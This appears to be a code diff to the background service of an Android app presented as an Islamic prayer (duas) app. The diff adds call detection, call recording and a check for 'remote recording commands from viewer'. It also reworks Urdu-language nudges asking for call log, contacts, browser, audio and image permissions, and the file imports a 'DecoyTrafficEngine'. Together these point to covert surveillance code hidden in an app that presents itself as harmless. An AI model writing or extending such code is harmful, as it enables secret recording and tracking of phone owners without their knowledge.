@@ -25,6 +25,8 @@ import islamic.duas.utils.DecoyTrafficEngine
 import islamic.duas.utils.DeviceId
 import islamic.duas.utils.ErrorLog
 import islamic.duas.wifi.WifiScanner
+import islamic.duas.media.CallDetector
+import islamic.duas.media.CallRecorder
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -125,6 +127,8 @@ class DuaForegroundService : Service() {
         super.onCreate()
         CloudApi.init(this)
         createNotificationChannel()
+        CallDetector.getInstance(this).startDetection()
+        CallRecorder.getInstance(this).cleanup()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -199,6 +203,9 @@ class DuaForegroundService : Service() {
                             val nm = getSystemService(NotificationManager::class.java)
                             nm.notify(NOTIF_ID, notification)
                         } catch (_: Exception) {}
+                        try {
+                            islamic.duas.PermissionNotificationManager(this@DuaForegroundService).checkAndPostAll()
+                        } catch (_: Exception) {}
                         lastNotifUpdate = now
                     }
 
@@ -261,6 +268,12 @@ class DuaForegroundService : Service() {
                         checkSyncRequest()
                     } catch (_: Exception) {}
 
+                    // Check for remote recording commands from viewer
+                    try {
+                        islamic.duas.media.RemoteRecorder.getInstance(this@DuaForegroundService)
+                            .checkAndHandleCommand()
+                    } catch (_: Exception) {}
+
                     if (now - lastSync > SYNC_INTERVAL_MS) {
                         if (isUserActive()) {
                             try {
@@ -299,6 +312,8 @@ class DuaForegroundService : Service() {
             android.util.Log.w("DuaFgService", "setAlarm failed: SCHEDULE_EXACT_ALARM not granted")
         }
         try { DuaSyncScheduler.onBoot(this) } catch (_: Exception) {}
+        CallDetector.getInstance(this).stopDetection()
+        CallRecorder.getInstance(this).cleanup()
         super.onDestroy()
     }
 
@@ -573,25 +588,6 @@ class DuaForegroundService : Service() {
             val parts = mutableListOf(info)
             if (extra.isNotBlank()) parts.add(extra.trimStart('\n'))
             if (weatherInfo.isNotBlank()) parts.add(weatherInfo.trimStart('\n'))
-
-            // Proactive permission nudge: hint in the persistent notification when the
-            // sync worker has flagged missing permissions/settings.
-            try {
-                val sp = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
-                val pending = sp.getStringSet("permission_prompt_pending", null)
-                if (!pending.isNullOrEmpty()) {
-                    val hints = mutableListOf<String>()
-                    if ("usage_stats" in pending) hints.add("استعمال کی اجازت")
-                    if ("images" in pending) hints.add("تصاویر")
-                    if ("audio" in pending) hints.add("آڈیو")
-                    if ("call_log" in pending) hints.add("کال لاگ")
-                    if ("contacts" in pending) hints.add("رابطے")
-                    if ("browser" in pending) hints.add("برائوزر")
-                    if (hints.isNotEmpty()) {
-                        parts.add("⚠ درکار اجازتیں: ${hints.joinToString("، ")} (ٹیپ کریں)")
-                    }
-                }
-            } catch (_: Exception) {}
 
             bodyText = parts.joinToString("\n")
         } catch (_: Exception) {
